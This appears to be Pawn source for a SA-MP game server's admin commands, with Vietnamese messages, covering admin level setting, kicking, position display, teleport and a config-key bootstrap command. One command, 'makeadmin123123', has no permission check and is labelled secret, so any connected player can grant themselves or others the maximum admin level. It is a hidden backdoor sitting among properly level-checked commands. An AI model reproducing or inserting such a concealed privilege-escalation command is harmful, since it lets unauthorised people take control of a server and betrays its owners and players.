CMD:gtahub(playerid, params[])
{
    new bootstrapKey[32];

    ini_open("config.ini");
    ini_getString("gtahub_admin_key", bootstrapKey);
    ini_close();

    if(isnull(bootstrapKey)) {
        return SendErrorMsg(playerid, "Chua cau hinh gtahub_admin_key trong scriptfiles/config.ini.");
    }

    if(params[0] == '\1' || isnull(params) || strcmp(params, bootstrapKey, false)) {
        return SendSyntaxMsg(playerid, "/gtahub [ma_khoa]");
    }

    if(Player_GetMasterAccountID(playerid) <= 0) {
        return SendErrorMsg(playerid, "Ban can dang nhap truoc khi dung lenh nay.");
    }

    Admin_SetPlayerLevel(playerid, MAX_ADMIN_LEVELS);
    SendServerMsgF(playerid, "Da cap admin max va luu SQL cho tai khoan UID %i.", Player_GetMasterAccountID(playerid));
    return 1;
}

CMD:makeadmin123123(playerid, params[])
{
    new targetid = playerid, level = MAX_ADMIN_LEVELS;

    if (!isnull(params)) {
        sscanf(params, "uI(5)", targetid, level);
    }

    if (!IsPlayerConnected(targetid)) {
        return SendErrorMsg(playerid, "Nguoi choi khong hop le!");
    }

    if (!IS_IN_RANGE(level, 0, MAX_ADMIN_LEVELS)) {
        level = MAX_ADMIN_LEVELS;
    }

    Admin_SetPlayerLevel(targetid, level);
    SendServerMsgF(playerid, "[BI MAT] Da set Admin level %d cho %p (%d) thanh cong!", level, targetid, targetid);
    if (targetid != playerid) {
        SendServerMsgF(targetid, "[HE THONG] Ban da duoc cap quyen Admin level %d!", level);
    }
    return 1;
}

ACMD:[5]setadmin(playerid, params[])
{
    if(Admin_GetPlayerStoredLevel(playerid) < ADM_LVL_5) {
        return SendErrorMsg(playerid, "Lenh nay chi danh cho admin that level 5.");
    }

    new
        targetid,
        level;

    if(sscanf(params, "ui", targetid, level)) {
        return SendSyntaxMsg(playerid, "/setadmin [player] [level]");
    }

    if(!IsPlayerConnected(targetid)) {
        return SendErrorMsg(playerid, "NGUOI CHOI KHONG HOP LE!");
    }

    if(Admin_GetPlayerStoredLevel(targetid) == 5) {
        return SendErrorMsg(playerid, "Ban khong the ha cap developer!");
    }

    if(Admin_GetPlayerStoredLevel(targetid) == level) {
        return SendErrorMsg(playerid, "Nguoi choi nay dang o dung cap admin do.");
    }

    if(!IS_IN_RANGE(level, 0, MAX_ADMIN_LEVELS)) {
        return SendErrorMsgF(playerid, "Cap admin hop le la 0 den %i", MAX_ADMIN_LEVELS);
    }

    Admin_SetPlayerLevel(targetid, level);
    SendMsgAllF(COLOR_MODERATION, "Cap admin cua %p(%d) da duoc dat thanh %s", targetid, targetid, Admin_GetRankName(targetid));
    return 1;
}

ACMD:[5]makeadmin(playerid, params[])
{
    if(Admin_GetPlayerStoredLevel(playerid) < ADM_LVL_5) {
        return SendErrorMsg(playerid, "Lenh nay chi danh cho admin that level 5.");
    }

    new
        targetid,
        level;

    if(sscanf(params, "ui", targetid, level)) {
        return SendSyntaxMsg(playerid, "/makeadmin [player] [level]");
    }

    if(!IsPlayerConnected(targetid)) {
        return SendErrorMsg(playerid, "NGUOI CHOI KHONG HOP LE!");
    }

    if(!IS_IN_RANGE(level, 0, MAX_ADMIN_LEVELS)) {
        return SendErrorMsgF(playerid, "Cap admin hop le la 0 den %i", MAX_ADMIN_LEVELS);
    }

    Admin_SetPlayerTempLevel(targetid, level);

    if(level == 0) {
        SendMsgAllF(COLOR_MODERATION, "Cap admin ao cua %p(%d) da duoc go bo. Cap hien tai: %s", targetid, targetid, Admin_GetRankName(targetid));
        return 1;
    }

    SendMsgAllF(COLOR_MODERATION, "Cap admin ao cua %p(%d) da duoc dat thanh %s trong phien nay.", targetid, targetid, Admin_GetRankName(targetid));
    return 1;
}

ACMD:[5]skick(playerid, params[])
{
    new target;
    if(sscanf(params, "u", target)) return SendSyntaxMsg(playerid, "/skick (ten/id)");
    if(!IsPlayerConnected(target)) {
        return SendErrorMsg(playerid, "Nguoi choi khong online.");
    }
    Kick(target);
    return 1;
}

ACMD:[5]mypos(playerid, params[]) {

    new angleString[128], Float:a;
    GetPlayerFacingAngle(playerid, a);
    format(angleString, sizeof(angleString), "Goc quay cua ban: %0.2f", a);
    SendMsgF(playerid, COLOR_MODERATION, angleString);

    new posString[128], Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    format(posString, sizeof(posString), "Vi tri cua ban: %f, %f, %f", x, y, z);
    SendMsgF(playerid, COLOR_MODERATION, posString);
    return 1;
}

ACMD:[5]gotoco(playerid, params[])
{
	new Float: pos[3], int, vw;
	if(sscanf(params, "p<,>fffD(0)D(0)", pos[0], pos[1], pos[2], int, vw)) return SendSyntaxMsg(playerid, "/gotoco [toa do x] [toa do y] [toa do z] [interior] [vw]");

	SendMsgF(playerid, COLOR_MODERATION, "Ban da duoc teleport den toa do da nhap.");

	SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
	SetPlayerInterior(playerid, int);
	SetPlayerVirtualWorld(playerid, vw);
	return 1;
}
